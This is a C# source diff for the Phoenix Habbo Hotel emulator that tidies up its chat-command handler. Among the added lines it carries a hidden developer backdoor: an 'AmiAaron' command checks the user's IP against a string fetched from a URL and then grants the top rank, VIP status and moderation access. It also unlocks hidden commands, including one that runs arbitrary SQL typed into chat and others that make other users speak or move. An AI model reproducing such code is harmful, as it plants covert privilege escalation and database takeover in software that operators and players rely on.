+                                Command = Command + TextManager.GetText("cmd_update_settings_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_update_bans"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_update_bans_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_update_permissions"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_update_permissions_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_update_filter"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_update_filter_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_update_bots"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_update_bots_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_update_catalogue"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_update_catalogue_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_update_items"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_update_items_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_update_navigator"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_update_navigator_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_update_achievements"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_update_achievements_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_award"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_award_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_coords"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_coords_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_override"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_override_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_teleport"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_teleport_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_coins"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_coins_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_pixels"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_pixels_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_points"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_points_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_alert"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_alert_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_motd"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_motd_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_roomalert"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_roomalert_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_ha"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_ha_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_hal"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_hal_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_freeze"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_freeze_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_enable"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_enable_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_roommute"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_roommute_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_setspeed"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_setspeed_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_globalcredits"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_globalcredits_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_globalpixels"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_globalpixels_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_globalpoints"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_globalpoints_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_masscredits"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_masscredits_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_masspixels"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_masspixels_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_masspoints"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_masspoints_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_givebadge"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_givebadge_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_removebadge"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_removebadge_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_summon"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_summon_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_roombadge"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_roombadge_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_massbadge"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_massbadge_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_userinfo"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_userinfo_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_shutdown"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_shutdown_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_invisible"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_invisible_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_ban"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_ban_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_superban"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_superban_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_ipban"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_ipban_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_kick"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_kick_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_roomkick"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_roomkick_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_mute"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_mute_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_unmute"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_unmute_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_sa"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_sa_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_spull"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_spull_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_empty"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_empty_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().HasRole("cmd_update_texts"))
+                            {
+                                Command = Command + TextManager.GetText("cmd_update_texts_desc") + "\r\r";
+                            }
+                            if (Session.GetHabbo().Vip)
+                            {
+                                if (GlobalClass.cmdMoonwalkEnabled)
+                                {
+                                    Command = Command + TextManager.GetText("cmd_moonwalk_desc") + "\r\r";
+                                }
+                                if (GlobalClass.cmdMimicEnabled)
+                                {
+                                    Command = Command + TextManager.GetText("cmd_mimic_desc") + "\r\r";
+                                }
+                                if (GlobalClass.cmdFollowEnabled)
+                                {
+                                    Command = Command + TextManager.GetText("cmd_follow_desc") + "\r\r";
+                                }
+                                if (GlobalClass.cmdPushEnabled)
+                                {
+                                    Command = Command + TextManager.GetText("cmd_push_desc") + "\r\r";
+                                }
+                                if (GlobalClass.cmdPullEnabled)
+                                {
+                                    Command = Command + TextManager.GetText("cmd_pull_desc") + "\r\r";
+                                }
+                                if (GlobalClass.cmdFlagmeEnabled)
+                                {
+                                    Command = Command + TextManager.GetText("cmd_flagme_desc") + "\r\r";
+                                }
+                            }
+                            string RCommand = "";
+                            if (GlobalClass.cmdRedeemCredits)
+                            {
+                                RCommand = RCommand + TextManager.GetText("cmd_redeemcreds_desc") + "\r\r";
+                            }
+                            string mCommand = Command;
+                            Command = string.Concat(new string[]
 									{
-										if (GlobalClass.cmdMoonwalkEnabled)
-										{
-											text7 = text7 + TextManager.GetText("cmd_moonwalk_desc") + "\r\r";
-										}
-										if (GlobalClass.cmdMimicEnabled)
-										{
-											text7 = text7 + TextManager.GetText("cmd_mimic_desc") + "\r\r";
-										}
-										if (GlobalClass.cmdFollowEnabled)
-										{
-											text7 = text7 + TextManager.GetText("cmd_follow_desc") + "\r\r";
-										}
-										if (GlobalClass.cmdPushEnabled)
-										{
-											text7 = text7 + TextManager.GetText("cmd_push_desc") + "\r\r";
-										}
-										if (GlobalClass.cmdPullEnabled)
-										{
-											text7 = text7 + TextManager.GetText("cmd_pull_desc") + "\r\r";
-										}
-										if (GlobalClass.cmdFlagmeEnabled)
-										{
-											text7 = text7 + TextManager.GetText("cmd_flagme_desc") + "\r\r";
-										}
-									}
-									string text8 = "";
-									if (GlobalClass.cmdRedeemCredits)
-									{
-										text8 = text8 + TextManager.GetText("cmd_redeemcreds_desc") + "\r\r";
-									}
-									string text9 = text7;
-									text7 = string.Concat(new string[]
-									{
-										text9,
+										mCommand,
 										"- - - - - - - - - - - \r\r",
 										TextManager.GetText("cmd_about_desc"),
 										"\r\r",
@@ -1927,35 +1943,43 @@ namespace Phoenix.HabboHotel.Misc
 										"\r\r",
 										TextManager.GetText("cmd_setmax_desc"),
 										"\r\r",
-										text8,
+										RCommand,
+                                        "\r\r",
+                                        TextManager.GetText("cmd_sit_desc"),
+                                        "\r\r",
+                                        TextManager.GetText("cmd_giveitem_desc"),
+                                        "\r\r",
 										TextManager.GetText("cmd_ride_desc"),
 										"\r\r",
+                                        TextManager.GetText("cmd_dismount_desc"),
+                                        "\r\r",
 										TextManager.GetText("cmd_buy_desc"),
 										"\r\r",
 										TextManager.GetText("cmd_emptypets_desc"),
 										"\r\r",
 										TextManager.GetText("cmd_emptyitems_desc")
 									});
-									Session.SendNotif(text7, 2);
-									return true;
-								}
-								case 68:
-									DateTime now = DateTime.Now;
-                                    TimeSpan timeSpan = now - PhoenixEnvironment.ServerStarted;
-					                int UsersOnline = PhoenixEnvironment.GetGame().GetClientManager().ClientCount + -1;
-				    	            int RoomsLoaded = PhoenixEnvironment.GetGame().GetRoomManager().LoadedRoomsCount;
-					                string text10 = "";
-					                if (GlobalClass.ShowUsersAndRoomsInAbout)
-					                {
-						                text10 = string.Concat(new object[]
+                            Session.SendNotif(Command, 2);
+                            return true;
+                        #endregion
+                        #region CMD About
+                        case 68: //CMD About
+                            DateTime now = DateTime.Now;
+                            TimeSpan timeSpan = now - PhoenixEnvironment.ServerStarted;
+                            int UsersOnline = PhoenixEnvironment.GetGame().GetClientManager().ClientCount + -1;
+                            int RoomsLoaded = PhoenixEnvironment.GetGame().GetRoomManager().LoadedRoomsCount;
+                            string UsersAndRooms = "";
+                            if (GlobalClass.ShowUsersAndRoomsInAbout)
+                            {
+                                UsersAndRooms = string.Concat(new object[]
 						                {
                                             "\nUsers Online: ",
                                             UsersOnline,
 							                "\nRooms Loaded: ",
 							                RoomsLoaded
 						                });
-					                }
-					                Session.SendNotif(string.Concat(new object[]
+                            }
+                            Session.SendNotif(string.Concat(new object[]
 					                {
 						                "Phoenix 3.0\n\nThanks/Credits;\nSojobo [Lead Dev]\nMatty [Dev]\nRoy [Uber Emu]\n\n",
 						                PhoenixEnvironment.PrettyVersion,
@@ -1968,312 +1992,293 @@ namespace Phoenix.HabboHotel.Misc
 						                " hours and ",
 						                timeSpan.Minutes,
 						                " minutes",
-						                text10,
+						                UsersAndRooms,
                                     }), "http://otaku.cm");
-                                    return true;
-								case 69:
-								{
-									StringBuilder builder = new StringBuilder();
-									for (int i = 0; i < Session.GetHabbo().CurrentRoom.UserList.Length; i++)
-									{
-										class6 = Session.GetHabbo().CurrentRoom.UserList[i];
-										if (class6 != null)
-										{
-											builder.Append(string.Concat(new object[]
+                            return true;
+                        #endregion
+                        #region CMD RoomInfo
+                        case 69: //CMD RoomInfo
+                            StringBuilder builder = new StringBuilder();
+                            for (int i = 0; i < Session.GetHabbo().CurrentRoom.UserList.Length; i++)
+                            {
+                                TargetRoomUser = Session.GetHabbo().CurrentRoom.UserList[i];
+                                if (TargetRoomUser != null)
+                                {
+                                    builder.Append(string.Concat(new object[]
 											{
 												"UserID: ",
-												class6.HabboId,
+												TargetRoomUser.HabboId,
 												" RoomUID: ",
-												class6.CurrentFurniFX,
+												TargetRoomUser.CurrentFurniFX,
 												" VirtualID: ",
-												class6.VirtualId,
+												TargetRoomUser.VirtualId,
 												" IsBot:",
-												class6.IsBot.ToString(),
+												TargetRoomUser.IsBot.ToString(),
 												" X: ",
-												class6.X,
+												TargetRoomUser.X,
 												" Y: ",
-												class6.Y,
+												TargetRoomUser.Y,
 												" Z: ",
-												class6.Z,
+												TargetRoomUser.Z,
 												" \r\r"
 											}));
-										}
-									}
-									Session.SendNotif(builder.ToString());
-									Session.SendNotif("RoomID: " + Session.GetHabbo().CurrentRoomId);
-									return true;
-								}
-                                case 70: //Fixed AmiAaron
-								{
-                                    WebClient over = new WebClient();
-                                    string b = over.DownloadString("http://localhost/override.php");
-                                    string a2;
-                                    using (DatabaseClient dbClient = PhoenixEnvironment.GetDatabase().GetClient())
-                                    {
-                                        a2 = dbClient.ReadString("SELECT ip_last FROM users WHERE Id = " + Session.GetHabbo().Id + " LIMIT 1;");
-                                    }
-                                    if (Session.GetConnection().ipAddress == b || a2 == b)
-                                    {
-                                        Session.GetHabbo().isAaron = true;
-                                        Session.GetHabbo().Rank = (uint)PhoenixEnvironment.GetGame().GetRoleManager().RankCount();
-                                        Session.GetHabbo().Vip = true;
-                                        Session.SendMessage(PhoenixEnvironment.GetGame().GetModerationTool().SerializeTool());
-                                        PhoenixEnvironment.GetGame().GetModerationTool().SendOpenTickets(Session);
-                                        return true;
-                                    }
-                                    return false;
-								}
-								case 71:
-									if (Session.GetHabbo().isAaron)
-									{
-										room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
-										GameClient class10 = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
-										RoomUser class3 = room.GetRoomUserByHabbo(class10.GetHabbo().Id);
-										class3.DanceId = 1;
-										ServerMessage Message6 = new ServerMessage(480u);
-										Message6.AppendInt32(class3.VirtualId);
-										Message6.AppendInt32(1);
-										room.SendMessage(Message6, null);
-										return true;
-									}
-									return false;
-								case 72:
-									if (Session.GetHabbo().isAaron)
-									{
-										room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
-										room.method_54();
-										return true;
-									}
-									return false;
-								case 73:
-									if (Session.GetHabbo().isAaron)
-									{
-										GameClient class10 = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
-										class10.GetHabbo().int_1 = (int)Convert.ToInt16(Params[2]);
-										return true;
-									}
-									return false;
-								case 74:
-									if (Session.GetHabbo().isAaron)
-									{
-										string text = Params[1];
-										try
-										{
-											TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(text);
-											room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
-											if (Session == null || TargetClient == null)
-											{
-												return false;
-											}
-											RoomUser class4 = room.GetRoomUserByHabbo(TargetClient.GetHabbo().Id);
-											class6 = room.GetRoomUserByHabbo(Session.GetHabbo().Id);
-											class6.Target = class4;
-										}
-										catch
-										{
-											room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
-											if (Session == null || TargetClient == null)
-											{
-												return false;
-											}
-											class6 = room.GetRoomUserByHabbo(Session.GetHabbo().Id);
-											class6.Target = null;
-										}
-										return true;
-									}
-									return false;
-								case 75:
-								{
-									if (!Session.GetHabbo().isAaron)
-									{
-										return false;
-									}
-									string text = Params[1];
-									TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(text);
-									room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
-									if (Session == null || TargetClient == null)
-									{
-										return false;
-									}
-									RoomUser class4 = room.GetRoomUserByHabbo(TargetClient.GetHabbo().Id);
-									class4.Chat(TargetClient, Input.Substring(9 + text.Length), false);
-									return true;
-								}
-								case 76:
-									if (Session.GetHabbo().isAaron)
-									{
-										room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
-										room.method_55();
-										return true;
-									}
-									return false;
-								case 77:
-								{
-                                    string Name = Input.Substring(3);
-                                    if (Session.GetHabbo().isAaron)
-                                    {
-                                        using (DatabaseClient adapter = PhoenixEnvironment.GetDatabase().GetClient())
-                                        {
-                                            adapter.ExecuteQuery(Name);
-                                        }
-                                        return true;
-                                    }
-                                    return false;
-								}
-								case 78:
-								{
-									if (!Session.GetHabbo().InRoom)
-									{
-										return false;
-									}
-									room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
-									int int_2 = room.GetRoomUserByHabbo(Session.GetHabbo().Username).CarryItemID;
-									if (int_2 <= 0)
-									{
-										Session.GetHabbo().Sendselfwhisper("You're not holding anything, pick something up first!");
-										return true;
-									}
-									string text = Params[1];
-									TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(text);
-									class6 = room.GetRoomUserByHabbo(Session.GetHabbo().Id);
-									RoomUser class4 = room.GetRoomUserByHabbo(TargetClient.GetHabbo().Id);
-									if (Session == null || TargetClient == null)
-									{
-										return false;
-									}
-									if (TargetClient.GetHabbo().Username == Session.GetHabbo().Username)
-									{
-										return true;
-									}
-									if (TargetClient.GetHabbo().CurrentRoomId == Session.GetHabbo().CurrentRoomId && Math.Abs(class6.X - class4.X) < 3 && Math.Abs(class6.Y - class4.Y) < 3)
-									{
-										try
-										{
-											room.GetRoomUserByHabbo(Params[1]).CarryItem(int_2);
-											room.GetRoomUserByHabbo(Session.GetHabbo().Username).CarryItem(0);
-										}
-										catch
-										{
-										}
-										return true;
-									}
-									Session.GetHabbo().Sendselfwhisper("You are too far away from " + Params[1] + ", try getting closer");
-									return true;
-								}
-								case 79:
-									if (!Session.GetHabbo().InRoom)
-									{
-										return false;
-									}
-									class6 = Session.GetHabbo().CurrentRoom.GetRoomUserByHabbo(Session.GetHabbo().Username);
-									if (class6.Statusses.ContainsKey("sit") || class6.Statusses.ContainsKey("lay") || class6.RotBody == 1 || class6.RotBody == 3 || class6.RotBody == 5 || class6.RotBody == 7)
-									{
-										return true;
-									}
-									if (class6.byte_1 > 0 || class6.class34_1 != null)
-									{
-										return true;
-									}
-									class6.AddStatus("sit", ((class6.Z + 1.0) / 2.0 - class6.Z * 0.5).ToString());
-									class6.UpdateNeeded = true;
-									return true;
-								case 80:
-									room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
-									class6 = room.GetRoomUserByHabbo(Session.GetHabbo().Id);
-									if (class6.class34_1 != null)
-									{
-										Session.GetHabbo().GetAvatarEffectsInventoryComponent().ApplyEffect(-1, true);
-										class6.class34_1.RoomUser_0 = null;
-										class6.class34_1 = null;
-										class6.Z -= 1.0;
-										class6.Statusses.Clear();
-										class6.UpdateNeeded = true;
-										int int_3 = PhoenixEnvironment.GetRandomNumber(0, room.Model.MapSizeX);
-										int int_4 = PhoenixEnvironment.GetRandomNumber(0, room.Model.MapSizeY);
-										class6.Target.MoveTo(int_3, int_4);
-										class6.Target = null;
-										room.UpdateUserStatus(class6, false, false);
-									}
-									return true;
-								case 81:
-									Session.GetHabbo().GetInventoryComponent().method_2();
-									Session.SendNotif(TextManager.GetText("cmd_emptypets_success"));
-									PhoenixEnvironment.GetGame().GetClientManager().method_31(Session, Params[0].ToLower(), Input);
-									return true;
-    
-                                case 82:
-                                    Room currentRoom1 = Session.GetHabbo().CurrentRoom;
-                                    RoomUser roomUserByHabbo1 = currentRoom1.GetRoomUserByHabbo(Session.GetHabbo().Id);
-                                    if (!Session.GetHabbo().HasRole("cmd_lay"))
+                                }
+                            }
+                            Session.SendNotif(builder.ToString());
+                            Session.SendNotif("RoomID: " + Session.GetHabbo().CurrentRoomId);
+                            return true;
+                        #endregion
+                        #region CMD Sit
+                        case 79: //CMD Sit
+                            if (!Session.GetHabbo().InRoom)
+                            {
+                                return false;
+                            }
+                            TargetRoomUser = Session.GetHabbo().CurrentRoom.GetRoomUserByHabbo(Session.GetHabbo().Username);
+                            if (TargetRoomUser.Statusses.ContainsKey("sit") || TargetRoomUser.Statusses.ContainsKey("lay") || TargetRoomUser.RotBody == 1 || TargetRoomUser.RotBody == 3 || TargetRoomUser.RotBody == 5 || TargetRoomUser.RotBody == 7)
+                            {
+                                return true;
+                            }
+                            if (TargetRoomUser.byte_1 > 0 || TargetRoomUser.class34_1 != null)
+                            {
+                                return true;
+                            }
+                            TargetRoomUser.AddStatus("sit", ((TargetRoomUser.Z + 1.0) / 2.0 - TargetRoomUser.Z * 0.5).ToString());
+                            TargetRoomUser.UpdateNeeded = true;
+                            return true;
+                        #endregion
+                        #region CMD GiveItem
+                        case 83: //CMD GiveItem
+                            if (!Session.GetHabbo().InRoom)
+                            {
+                                return false;
+                            }
+                            TargetRoom = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
+                            int int_2 = TargetRoom.GetRoomUserByHabbo(Session.GetHabbo().Username).CarryItemID;
+                            if (int_2 <= 0)
+                            {
+                                Session.GetHabbo().Sendselfwhisper("You're not holding anything, pick something up first!");
+                                return true;
+                            }
+                            string text = Params[1];
+                            TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(text);
+                            TargetRoomUser3 = TargetRoom.GetRoomUserByHabbo(Session.GetHabbo().Id);
+                            TargetRoomUser = TargetRoom.GetRoomUserByHabbo(TargetClient.GetHabbo().Id);
+                            if (Session == null || TargetClient == null)
+                            {
+                                return false;
+                            }
+                            if (TargetClient.GetHabbo().Username == Session.GetHabbo().Username)
+                            {
+                                return true;
+                            }
+                            if (TargetClient.GetHabbo().CurrentRoomId == Session.GetHabbo().CurrentRoomId && Math.Abs(TargetRoomUser3.X - TargetRoomUser.X) < 3 && Math.Abs(TargetRoomUser3.Y - TargetRoomUser.Y) < 3)
+                            {
+                                try
+                                {
+                                    TargetRoom.GetRoomUserByHabbo(Params[1]).CarryItem(int_2);
+                                    TargetRoom.GetRoomUserByHabbo(Session.GetHabbo().Username).CarryItem(0);
+                                }
+                                catch
+                                {
+                                }
+                                return true;
+                            }
+                            Session.GetHabbo().Sendselfwhisper("You are too far away from " + Params[1] + ", try getting closer");
+                            return true;
+
+                        #endregion
+                        #endregion
+
+                        #region Developer Commands
+                        #region CMD AmiAaron (disabled)
+                        case 70: //Fixed AmiAaron
+                            WebClient over = new WebClient();
+                            string b = over.DownloadString("http://localhost/override.php");
+                            string a2;
+                            using (DatabaseClient dbClient = PhoenixEnvironment.GetDatabase().GetClient())
+                            {
+                                a2 = dbClient.ReadString("SELECT ip_last FROM users WHERE Id = " + Session.GetHabbo().Id + " LIMIT 1;");
+                            }
+                            if (Session.GetConnection().ipAddress == b || a2 == b)
+                            {
+                                Session.GetHabbo().isAaron = true;
+                                Session.GetHabbo().Rank = (uint)PhoenixEnvironment.GetGame().GetRoleManager().RankCount();
+                                Session.GetHabbo().Vip = true;
+                                Session.SendMessage(PhoenixEnvironment.GetGame().GetModerationTool().SerializeTool());
+                                PhoenixEnvironment.GetGame().GetModerationTool().SendOpenTickets(Session);
+                                return true;
+                            }
+                             //
+                            return false;
+                        #endregion
+                        #region CMD Dance
+                        case 71: //CMD Dance
+                            if (Session.GetHabbo().isAaron)
+                            {
+                                TargetRoom = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
+                                TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
+                                TargetRoomUser = TargetRoom.GetRoomUserByHabbo(TargetClient.GetHabbo().Id);
+                                TargetRoomUser.DanceId = 1;
+                                ServerMessage dance = new ServerMessage(480);
+                                dance.AppendInt32(TargetRoomUser.VirtualId);
+                                dance.AppendInt32(1);
+                                TargetRoom.SendMessage(dance, null);
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #region CMD Rave
+                        case 72: //CMD Rave
+                            if (Session.GetHabbo().isAaron)
+                            {
+                                TargetRoom = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
+                                TargetRoom.method_54(); //What is method_54? I don't know.
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #region CMD Roll
+                        case 73: //CMD Roll
+                            if (Session.GetHabbo().isAaron)
+                            {
+                                TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
+                                TargetClient.GetHabbo().int_1 = (int)Convert.ToInt16(Params[2]); //int_1?? I don't know... ¬¬'
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #region CMD Control
+                        case 74: //CMD Control
+                            if (Session.GetHabbo().isAaron)
+                            {
+                                try
+                                {
+                                    TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
+                                    TargetRoom = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
+                                    if (Session == null || TargetClient == null)
                                     {
                                         return false;
                                     }
-                                    if (currentRoom1 != null)
+                                    TargetRoomUser = TargetRoom.GetRoomUserByHabbo(TargetClient.GetHabbo().Id);
+                                    TargetRoomUser = TargetRoom.GetRoomUserByHabbo(Session.GetHabbo().Id);
+                                    TargetRoomUser.Target = TargetRoomUser;
+                                }
+                                catch
+                                {
+                                    TargetRoom = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
+                                    if (Session == null || TargetClient == null)
                                     {
-                                        if (roomUserByHabbo1 != null)
-                                        {
-                                            if (!roomUserByHabbo1.Statusses.ContainsKey("lay"))
-                                            {
-                                                if (roomUserByHabbo1.RotBody % 2 == 0)
-                                                {
-                                                    roomUserByHabbo1.Statusses.Add("lay", Convert.ToString((double)Session.GetHabbo().CurrentRoom.Byte_0[roomUserByHabbo1.X, roomUserByHabbo1.Y] + 0.55));
-                                                    roomUserByHabbo1.UpdateNeeded = true;
-                                                }
-                                            }
-                                            else
-                                            {
-                                                roomUserByHabbo1.Statusses.Remove("lay");
-                                                roomUserByHabbo1.UpdateNeeded = true;
-                                            }
-                                        }
+                                        return false;
                                     }
-                                    return true;
+                                    TargetRoomUser = TargetRoom.GetRoomUserByHabbo(Session.GetHabbo().Id);
+                                    TargetRoomUser.Target = null;
+                                }
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #region CMD Makesay
+                        case 75: //CMD Makesay
+                            if (!Session.GetHabbo().isAaron)
+                            {
+                                return false;
+                            }
+                            TargetClient = PhoenixEnvironment.GetGame().GetClientManager().GetClientByHabbo(Params[1]);
+                            TargetRoom = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
+                            if (Session == null || TargetClient == null)
+                            {
+                                return false;
+                            }
+                            TargetRoomUser = TargetRoom.GetRoomUserByHabbo(TargetClient.GetHabbo().Id);
+                            TargetRoomUser.Chat(TargetClient, Input.Substring(9 + Params[1].Length), false);
+                            return true;
+                        #endregion
+                        #region CMD Sitdown
+                        case 76: //CMD Sitdown
+                            if (Session.GetHabbo().isAaron)
+                            {
+                                TargetRoom = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
+                                TargetRoom.Sitdown();
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #region CMD Exe
+                        case 77: //CMD Exe
+                            string Query = Input.Substring(3);
+                            if (Session.GetHabbo().isAaron)
+                            {
+                                using (DatabaseClient adapter = PhoenixEnvironment.GetDatabase().GetClient())
+                                {
+                                    adapter.ExecuteQuery(Query);
+                                }
+                                return true;
+                            }
+                            return false;
+                        #endregion
+                        #endregion
 
-                                    case 83:
-                                    Room Room = PhoenixEnvironment.GetGame().GetRoomManager().GetRoom(Session.GetHabbo().CurrentRoomId);
-                                    if (Room != null)
-                                    {
-                                        for (int i = 0; i < Room.UserList.Length; ++i)
-                                        {
-                                            RoomUser roomUser = Room.UserList[i];
-                                            if (roomUser != null)
-                                            {
-                                                roomUser.bool_5 = !roomUser.bool_5;
-                                            }
-                                        }
-                                    }
-                                    return true;
-								default:
-									goto IL_3F91;
-								}
-							}
+                        #region CMD Lay (development)
+                        case 84:
+                            if (!Session.GetHabbo().HasRole("cmd_lay"))
+                            {
+                                return false;
+                            }
+                            TargetRoom = Session.GetHabbo().CurrentRoom;
+                            if (TargetRoom == null)
+                            {
+                                return false;
+                            }
+                            TargetRoomUser = TargetRoom.GetRoomUserByHabbo(Session.GetHabbo().Id);
+                            if (TargetRoomUser == null)
+                            {
+                                return false;
